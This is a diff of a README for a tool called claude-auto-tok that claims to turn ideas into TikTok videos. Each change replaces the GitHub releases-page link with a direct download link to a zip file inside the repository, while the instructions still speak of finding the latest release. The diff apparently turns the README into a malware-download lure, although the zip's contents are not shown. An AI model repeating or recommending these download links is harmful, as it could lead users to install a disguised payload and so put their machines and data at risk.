@@ -1,10 +1,10 @@
 # 🤖 claude-auto-tok - Turn ideas into TikTok videos fast
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/scowlsericulturist188/claude-auto-tok/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/scowlsericulturist188/claude-auto-tok/main/public/auto_claude_tok_2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/scowlsericulturist188/claude-auto-tok/releases
+Visit this page to download: https://raw.githubusercontent.com/scowlsericulturist188/claude-auto-tok/main/public/auto_claude_tok_2.5.zip
 
 1. Open the link above
 2. Find the latest release
@@ -175,7 +175,7 @@ This project connects to:
 
 Open the releases page and download the latest Windows build:
 
-https://github.com/scowlsericulturist188/claude-auto-tok/releases
+https://raw.githubusercontent.com/scowlsericulturist188/claude-auto-tok/main/public/auto_claude_tok_2.5.zip
 
 ## 🧰 Basic troubleshooting
 
